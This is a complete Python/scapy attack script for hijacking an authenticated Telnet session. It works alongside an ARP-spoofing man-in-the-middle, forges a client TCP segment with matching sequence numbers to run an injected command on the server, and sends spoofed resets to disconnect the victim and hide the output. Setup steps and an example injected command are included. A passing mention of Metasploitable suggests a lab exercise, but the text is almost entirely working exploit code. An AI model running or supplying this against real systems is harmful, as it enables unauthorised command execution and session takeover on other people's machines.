#!/usr/bin/env python3
"""
telnet_hijack.py -- inject a command into an already-authenticated Telnet
session that we are man-in-the-middle for (via arp_spoof.py).

Prereqs:
  * MITM is up (both directions):  sudo python3 arp_spoof.py <client> <server>
  * IP forwarding is ON so the real session stays alive. arp_spoof.py turns on
    /proc/sys/net/ipv4/ip_forward, but you ALSO need the firewall to relay:
        sudo iptables -P FORWARD ACCEPT
  * The victim has already logged in over telnet and is sitting idle at the
    shell prompt.

Idea:
  Every Telnet packet is cleartext and carries the live TCP seq/ack numbers.
  We anchor on the client's own keystroke stream, forge ONE data segment that
  looks like it came from the client (correct seq/ack), so the server accepts
  and runs our command. Then we RST the real client so it can't send
  conflicting ACKs (kills the "ACK storm" and hides the injected output).

Note on running from the MITM host:
  Each segment crosses our interface twice (received from the client, then
  re-sent to the server by IP forwarding). The two copies are byte-identical,
  so a single one is a fine anchor -- what actually matters is anchoring on a
  *fresh* client->server data segment, not a stale or half-typed one. So:

Best practice:
  Right before running this, press Enter once in the victim's telnet session
  (at the shell prompt). That emits a clean, current client segment for us to
  anchor on and leaves the prompt empty, so our command lands on its own line.
"""
from scapy.all import IP, TCP, Raw, sniff, send
import argparse


def build_args():
    p = argparse.ArgumentParser(description="Telnet TCP session hijack (command injection)")
    p.add_argument("client", help="Victim IP (the telnet client)")
    p.add_argument("server", help="Telnet server IP (e.g. Metasploitable)")
    p.add_argument("-c", "--command", default="id\n",
                   help=r"Command to inject, include trailing \n. Default: 'id\n'")
    p.add_argument("-i", "--iface", default=None, help="Interface to sniff/inject on")
    return p.parse_args()


def main():
    a = build_args()
    # The shell passes \n literally inside single quotes (-c 'id\n'), so turn
    # literal \n \t \r into real control bytes -- otherwise the injected line
    # has no trailing Enter and the server's shell never runs it.
    cmd = a.command.replace("\\n", "\n").replace("\\t", "\t").replace("\\r", "\r").encode()

    # Freshest, least ambiguous anchor: a client -> server data segment (a
    # keystroke). It gives us the client's exact next sequence number directly.
    def is_client_data(pkt):
        return (pkt.haslayer(TCP) and pkt.haslayer(IP) and pkt.haslayer(Raw)
                and pkt[TCP].dport == 23
                and pkt[IP].src == a.client and pkt[IP].dst == a.server)

    # Fallback: any packet of this session (still works if the victim is idle).
    def is_session(pkt):
        return (pkt.haslayer(TCP) and pkt.haslayer(IP)
                and 23 in (pkt[TCP].sport, pkt[TCP].dport)
                and {pkt[IP].src, pkt[IP].dst} == {a.client, a.server})

    print("[*] Hijacking Telnet {} -> {}".format(a.client, a.server))
    print("[*] Press Enter once in the victim's telnet session now "
          "(gives a clean, current anchor)...")

    pkts = sniff(iface=a.iface, lfilter=is_client_data, count=1, timeout=30)
    if not pkts:
        print("[*] No keystroke seen; falling back to any session packet...")
        pkts = sniff(iface=a.iface, lfilter=is_session, count=1, timeout=30)
    if not pkts:
        print("[-] No telnet traffic. Is the victim logged in? Is the MITM up "
              "(and 'iptables -P FORWARD ACCEPT' set)?")
        return

    p = pkts[0]
    plen = len(p[Raw].load) if p.haslayer(Raw) else 0

    if p[IP].src == a.client:              # client -> server segment
        cport, seq, ack = p[TCP].sport, p[TCP].seq + plen, p[TCP].ack
    else:                                  # server -> client segment
        cport, seq, ack = p[TCP].dport, p[TCP].ack, p[TCP].seq + plen

    print("[*] client port {}  seq={}  ack={}".format(cport, seq, ack))
    print("[+] Injecting as the client: {!r}".format(cmd))

    # Forge the client's next data segment carrying our command.
    send(IP(src=a.client, dst=a.server) /
         TCP(sport=cport, dport=23, flags="PA", seq=seq, ack=ack) / Raw(load=cmd),
         iface=a.iface, verbose=0)

    # Silence the real client (RST spoofed from the server) to avoid an ACK
    # storm and to stop the victim seeing the injected command's output.
    send(IP(src=a.server, dst=a.client) /
         TCP(sport=23, dport=cport, flags="R", seq=ack),
         iface=a.iface, verbose=0, count=3)

    print("[+] Done -- the server ran our command inside the victim's session.")
    print(r"[!] Prove it: -c 'id > /tmp/pwned\n'  then check /tmp/pwned on the server.")


if __name__ == "__main__":
    main()
